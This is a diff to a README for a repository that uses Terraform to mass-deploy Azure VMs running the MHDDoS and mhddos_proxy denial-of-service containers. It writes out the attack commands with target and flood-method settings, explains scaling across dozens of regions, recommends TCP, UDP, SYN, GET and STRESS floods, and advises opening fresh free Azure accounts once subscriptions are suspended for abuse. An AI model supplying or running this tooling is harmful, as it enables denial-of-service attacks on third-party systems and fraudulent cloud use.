@@ -1,9 +1,9 @@
-> Note! You're free to use this repo a way you want but pay attention to the legal liability you may have if you use this configuration without compliance with your local laws
+> Note! You're free to use this repo a way you want, but you should pay attention to the legal liability you may have, if you use this configuration without compliance with your local laws
 
 # Overview
 
 Here I use Terraform to automate Azure VM deployment which run [MHDDOS](https://github.com/MHProDev/MHDDoS) or [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) docker container.
-You can deploy VMs to any Azure region, I prefer those that are located in Asia. Table of available regions:
+You can deploy VMs to any Azure region; I prefer those that are located in Asia. Table of available regions:
 
 | Region code        |     Region Name      |
 |--------------------|:--------------------:|
@@ -64,7 +64,7 @@ installed azure CLI and terraform tools are required. To install these tools che
 - Azure CLI https://docs.microsoft.com/en-us/cli/azure/install-azure-cli
 - Terraform https://learn.hashicorp.com/tutorials/terraform/install-cli
 
-In general, `udp/tcp/dns` mhddos attacks are network intensive so your free subscription will be suspended after around
+In general, `udp/tcp/get` mhddos attacks are network intensive so your free subscription will be suspended after around
 24 hours of active attacks. SYN mhddos attack doesn't require many network resources thus you can use your subscription
 longer.  
 After your subscription is over you can register a new Microsoft account and apply for a new free Azure subscription.
@@ -105,7 +105,7 @@ cd mhddos-azure-terraform/
 ```shell
 az login
 ```
-4. Select target and attack method. Open the `cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
+4. Select target and attack method. Open the `./modules/vms/cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
  - For original [MHDDOS](https://github.com/MHProDev/MHDDoS) `"docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your
 customizations must follow this command as in example below:
    
@@ -125,10 +125,10 @@ runcmd:
   - "docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
 # here 'tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug' is your attack configuration that fully compliant with MHDDOS_PROXY
 ```
-Save the `cloud-init.yaml` file.
+Save the `./modules/vms/cloud-init.yaml` file.
 
 ## Automatic flow
-Automatic flow is preferred for those who aren't familiar with `terraform`. If you're on Windows PC you have to use 
+Automatic flow is preferred for those who aren't familiar with `terraform`. If you're on Windows PC, you have to use 
 linux terminal such as `Cygwin` or `Git Bash`.
 4. Deploy VMs to the specified regions passed as arguments to the `./start-by-regions.sh`: 
 ```shell
@@ -144,12 +144,15 @@ Example of deployment to all possible regions:
 ```shell
 ./start-by-region.sh centralus eastasia southeastasia eastus eastus2 westus westus2 northcentralus southcentralus westcentralus northeurope westeurope japaneast japanwest brazilsouth australiasoutheast australiaeast westindia southindia centralindia canadacentral canadaeast uksouth ukwest koreacentral koreasouth francecentral southafricanorth uaenorth australiacentral switzerlandnorth germanywestcentral norwayeast westus3 swedencentral
 ```
-5. Verify after a couple of minutes on azure portal the load of VMs' CPUs, RAM, network. CPU or RAM usage must be around
-   100%.  
+5. Verify on azure portal dashboard the load of VMs' CPUs and network. CPU usage more 30-50% along with some network out traffic must be shown.
+   To open that dashboard:
+   ![azure portal dashboard button](pics/portal-menu-dashboard.png "How to open dashboard")
+   Then you should see your dashboard as in example below:
+   ![vm dashboard](pics/dashboard.png "Vm utilization dashboard")
    In fact, load percentage depends on the attack method and its configuration such as proxying, threads or request per
    connection count. There isn't a silver bullet configuration and attack method that works perfectly on any target. You
    have to make some effort to figure out the best for every case. Good methods to start with: `TCP`,`UDP`, `SYN`, `GET`
-   , `DNS`.
+   , `STRESS`.
 6. Stop attack and destroy VMs:
 ```shell
 ./destroy-by-region.sh <region1> ... <regionN>
@@ -170,23 +173,27 @@ terraform init
 5. Deploy to the specified azure region (you must be logged in through `az login`). Examples:
 
 ```shell
-terraform apply -state india.tfstate -var="location=southindia" -var="resource_group_name=mhddosIndia" -auto-approve
-terraform apply -state korea.tfstate -var="location=koreacentral" -var="resource_group_name=mhddosKorea" -auto-approve
-terraform apply -state japan.tfstate -var="location=japaneast" -var="resource_group_name=mhddosJapan" -auto-approve
+# deploy to southindia region 4 VMs  with sku Standard_F1s
+terraform apply -var='locations=["southindia"]' -auto-approve
+# deploy to koreacentral and japaneast regions 4 VMs with sku Standard_F1s per each
+terraform apply -var='locations=["koreacentral","japaneast"]' -auto-approve
+# deploy to japaneast region 2 VMs with sku Standard_D2_v2, requires manual approve
+terraform apply -var='locations=["japaneast"]' -var="vm_size=Standard_D2_v2" -var="vm_count=2"
 ```
 
-6. Verify after a couple of minutes on azure portal the load of VMs' CPUs, RAM, network. CPU or RAM usage must be around
-   100%.  
+6. Verify on azure portal dashboard the load of VMs' CPUs and network. CPU usage more 30-50% along with some network out traffic must be shown.
+   To open that dashboard, click the button as on the picture below:
+   ![azure portal dashboard button](pics/portal-menu-dashboard.png "How to open dashboard")
+   Then you should see your dashboard as in example below:
+   ![vm dashboard](pics/dashboard.png "Vm utilization dashboard")
    In fact, load percentage depends on the attack method and its configuration such as proxying, threads or request per
    connection count. There isn't a silver bullet configuration and attack method that works perfectly on any target. You
    have to make some effort to figure out the best for every case. Good methods to start with: `TCP`,`UDP`, `SYN`, `GET`
-   , `DNS`.
-7. Stop attack and destroy VMs. Examples:
+   , `STRESS`.
+7. Stop attack and destroy VMs. Example:
 
 ```shell
-terraform destroy -state india.tfstate -auto-approve
-terraform destroy -state korea.tfstate -auto-approve
-terraform destroy -state japan.tfstate -auto-approve
+terraform destroy -auto-approve
 ```
 
 # Troubleshooting
@@ -202,31 +209,42 @@ connect to your VMs and figure things out.
 1. Find out the target VM's public ip through Azure Portal or using terminal
 
 ```shell
-terraform output -state <your_state_file>.tfstate instancePublicIPs
+# Outputs VMs' public IPs by region in the format:
+# {<regionName> = [<IP1>, <IP2>, ... , <IPn>]}
+terraform output instance_public_ips_by_regions
 ```
 
-2. Remove outadeted private key (if exist)
+2. Remove outdated private key (if exist)
 
 ```shell
-rm -f <regionName>.pem
+rm -f <keyFileName>.pem
 ```
 
-3.  Export a private key to the file:
+3.  Save private key to the file `<keyFileName>.pem`:
 
 ```shell
-terraform output -raw -state <your_state_file>.tfstate tls_private_key > <regionName>.pem
+# Outputs VMs' private key by region in the format:
+# {<regionName> = <<-EOT  
+# -----BEGIN RSA PRIVATE KEY-----
+# <some key content>
+# -----BEGIN RSA PRIVATE KEY-----
+#
+# EOT
+# }
+# So, you should copy a key value only for the required region
+terraform output tls_private_keys
 ```
 
 4. Add a read access to the key file:
 
 ```shell
-chmod 400 <regionName>.pem
+chmod 400 <keyFileName>.pem
 ```
 
 5. Connect via SSH:
 
 ```shell
-ssh -i <regionName>.pem azureuser@<your_vm_IP>
+ssh -i <keyFileName>.pem azureuser@<your_vm_IP>
 ```
 
 6. Check a status of the `mhddos` docker container:
